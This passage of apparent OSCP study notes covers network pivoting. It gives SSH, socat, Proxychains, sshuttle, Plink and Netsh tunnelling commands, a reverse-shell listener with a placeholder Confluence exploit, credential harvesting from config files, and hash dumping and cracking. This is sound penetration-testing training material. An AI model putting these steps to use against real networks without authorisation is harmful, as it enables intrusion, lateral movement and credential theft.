9. **Netsh:** native Windows TCP port forwarding plus firewall configuration.

The core skill is not memorizing switches in isolation. It is recognizing **network reachability** and choosing the forwarding direction that makes the useful listening socket appear on the side you can access.

---

# Tool and Command Reference

## Network discovery

### `ip addr`

```bash
ip addr
```

Use after gaining a shell to identify all local interfaces and discover additional connected networks.

### `ip route`

```bash
ip route
```

Use to determine what subnets the compromised host can route to and which interfaces/gateways it uses.

### `ss`

```bash
ss -ntplu
```

Use to confirm that a forwarding command actually created the expected listener.

### `netstat` on Windows

```cmd
netstat -anp TCP | find "2222"
```

Use to confirm a Netsh listener.

---

## Port forwarding

### Socat

```bash
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
```

Simple TCP relay.

```bash
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
```

Expose internal SSH through a pivot.

### SSH local

```bash
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
```

Listener on SSH client → fixed destination from SSH server side.

### SSH dynamic

```bash
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
```

SOCKS proxy on SSH client → arbitrary destinations from SSH server side.

### SSH remote

```bash
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```

Listener on SSH server → fixed destination from SSH client side.

### SSH remote dynamic

```bash
ssh -N -R 9998 kali@192.168.118.4
```

SOCKS proxy on SSH server → arbitrary destinations from SSH client side.

---

## Proxychains

Typical configuration:

```ini
[ProxyList]
socks5 127.0.0.1 9998
```

or, when the SOCKS listener lives on a reachable pivot:

```ini
[ProxyList]
socks5 192.168.50.63 9999
```

Run tools:

```bash
proxychains <command>
```

Prefer TCP-connect based tools/operations.

---

# Choosing the Right Technique

| Situation | Good choice | Why |
|---|---|---|
| Need one TCP service; can bind a reachable port on pivot | `socat` | Simplest |
| Can SSH from pivot to deeper host; need one service | `ssh -L` | Fixed local forward |
| Can SSH from pivot to deeper host; need many hosts/ports | `ssh -D` + Proxychains | SOCKS flexibility |
| Inbound to pivot blocked; pivot can SSH to Kali; need one service | `ssh -R listen:target` | Reverse listener on Kali |
| Inbound to pivot blocked; pivot can SSH to Kali; need many hosts/ports | `ssh -R <port>` + Proxychains | Reverse SOCKS proxy |
| Have SSH and need transparent access to whole subnets | `sshuttle` | VPN-like routing |
| Windows has OpenSSH | `ssh.exe` | Same patterns as Linux OpenSSH |
| Windows lacks OpenSSH | Plink | Lightweight SSH forwarding |
| Windows admin and need native listener/forward | Netsh `portproxy` | Built-in forwarding |

---

# Troubleshooting Checklist

If a tunnel does not work, verify the path one hop at a time.

1. **Can the pivot reach the destination?**
   ```bash
   nc -zv -w 1 <target> <port>
   ```

2. **Is the forwarding process still alive?**
   ```bash
   ps aux | grep -E 'ssh|socat'
   ```

3. **Is the expected listener bound?**
   ```bash
   ss -ntplu
   ```

4. **Is it bound to the correct interface?**
   - `127.0.0.1` → only local connections.
   - `0.0.0.0` → all IPv4 interfaces.
   - Specific IP → only that interface.

5. **Are you using a privileged port?**
   - On Linux, an unprivileged user normally cannot bind below TCP/1024.

6. **Is a host firewall blocking the listener?**
   - Windows example:
     ```cmd
     netsh advfirewall firewall add rule ...
     ```

7. **For Proxychains, is the SOCKS entry correct?**
   ```bash
   tail /etc/proxychains4.conf
   ```

8. **For Nmap through Proxychains, use TCP connect scans**
   ```bash
   proxychains nmap -sT -Pn -n <target>
   ```

9. **Need SSH diagnostics?**
   ```bash
   ssh -v ...
   ```

10. **Is the shell too limited for SSH prompts?**
    ```bash
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    ```

---

# OSCP Attack-Chain Connection

## Recon → Enumeration

After initial access, immediately inspect network context:

```bash
ip addr
ip route
ss -ntplu
```

Ask:

- Does the host have multiple NICs?
- Which internal subnets are directly connected?
- Which services are only reachable from this machine?

A second NIC or internal route often signals a pivot opportunity.

## Enumeration → Initial Access

The chapter uses a vulnerable Confluence instance as the first foothold:

```bash
nc -nvlp 4444
curl '<CVE-2022-26134 payload>'
```

Once code execution is achieved, the target becomes a network vantage point.

## Initial Access → Credentials

Search service/application configuration for reusable credentials:

```bash
cat /var/atlassian/application-data/confluence/confluence.cfg.xml
```

Then use newly reachable services to obtain more credentials/hashes:

```bash
psql ...
```

```sql
\c confluence
select * from cwd_user;
```

```bash
hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt
```

## Credentials → Pivoting

Test credential reuse against internal services:

```bash
ssh database_admin@...
smbclient ...
xfreerdp ...
```

Use forwarding when Kali cannot directly reach those services.

## Pivoting → AD

In an AD-focused network, the same tunnel gives your Kali tools reachability to domain infrastructure. Typical services you may need to make reachable include:

- DNS — TCP/UDP 53
- Kerberos — TCP/UDP 88
- RPC Endpoint Mapper — TCP 135
- SMB — TCP 445
- LDAP — TCP 389
- LDAPS — TCP 636
- Global Catalog — TCP 3268/3269
- WinRM — TCP 5985/5986
- RDP — TCP 3389
- MSSQL — TCP 1433

A dynamic SOCKS tunnel or `sshuttle` is often much easier than creating a separate fixed port forward for each AD service.

## AD → Proof

Once you can route or proxy to deeper systems, continue normal exploitation/enumeration until you obtain the required proof. Keep your forwarding setup stable and document:

- pivot host
- tunnel type
- local listener
- SSH endpoint
- destination subnet/service
- credentials used

---

# Mini Cheat Sheet — Exam-Side Version

> [!tip] 18 commands/reminders worth keeping beside you

```bash
# 1. Check interfaces for a second NIC / internal subnet
ip addr

# 2. Check routes
ip route

# 3. Check listeners
ss -ntplu

# 4. Upgrade a Linux shell for interactive SSH
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 5. Quick internal TCP-port sweep from a pivot
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done

# 6. Socat: expose one internal TCP service
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22

# 7. SSH local forward: listener on SSH client
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 user@SSH_SERVER

# 8. SSH dynamic forward: SOCKS on SSH client
ssh -N -D 0.0.0.0:9999 user@SSH_SERVER

# 9. SSH remote forward: listener on SSH server/Kali
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@KALI_IP

# 10. SSH remote dynamic: reverse SOCKS on Kali
ssh -N -R 9998 kali@KALI_IP

# 11. Proxychains SOCKS config
# /etc/proxychains4.conf
socks5 127.0.0.1 9998

# 12. Nmap through SOCKS — use TCP connect
proxychains nmap -sT -Pn -n --top-ports=20 TARGET

# 13. SMB through SOCKS
proxychains smbclient -L //TARGET/ -U USER --password=PASS

# 14. sshuttle whole subnets
sshuttle -r user@PIVOT:SSH_PORT 10.4.50.0/24 172.16.50.0/24

# 15. Windows: confirm OpenSSH
where ssh
ssh.exe -V

# 16. Windows Plink remote forward
plink.exe -ssh -l kali -pw PASS -R 127.0.0.1:9833:127.0.0.1:3389 KALI_IP

# 17. Windows Netsh port forward
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=PIVOT_IP connectport=22 connectaddress=TARGET_IP

# 18. Windows Firewall: allow then CLEAN UP
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=PIVOT_IP localport=2222 action=allow
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=PIVOT_IP
```

## One-line memory aid

```text
-L = listen Local/client side
-D = Dynamic SOCKS on client side
-R listen:target = Remote listener on server side
-R port = Remote Dynamic SOCKS on server side
```

## Exam decision shortcut

```text
Can Kali reach a listener on the pivot?
  YES -> Socat / SSH -L / SSH -D
  NO  -> Can pivot SSH out to Kali?
           YES -> SSH -R / remote dynamic -R
Have SSH and need whole subnets?
  -> sshuttle
Windows?
  -> ssh.exe, Plink, or Netsh depending privileges/tools
```

---

# High-Value Reminders

- Draw the network before creating a tunnel.
- Always identify **where the listener will be**.
- `-L` and `-D` bind on the SSH **client**.
- `-R` binds on the SSH **server**.
- `-N` is ideal for tunnel-only SSH sessions.
- Dynamic forwarding creates SOCKS; non-SOCKS-aware programs may need Proxychains.
- Proxychains + Nmap should generally use `-sT`, not raw SYN scanning.
- `127.0.0.1` means the listener is only reachable locally.
- `0.0.0.0` exposes a listener on all IPv4 interfaces; use intentionally.
- A firewall can still block a correctly configured port forward.
- On Linux, ports below `1024` generally require privilege.
- On Windows, Netsh `portproxy` changes require administrator privileges.
- Clean up temporary firewall and portproxy rules.
- Credential reuse often turns a forwarding path into a deeper shell.
- A second NIC or unexpected route is a major pivoting clue.
- For OSCP, prefer the simplest tunnel that solves the immediate reachability problem.
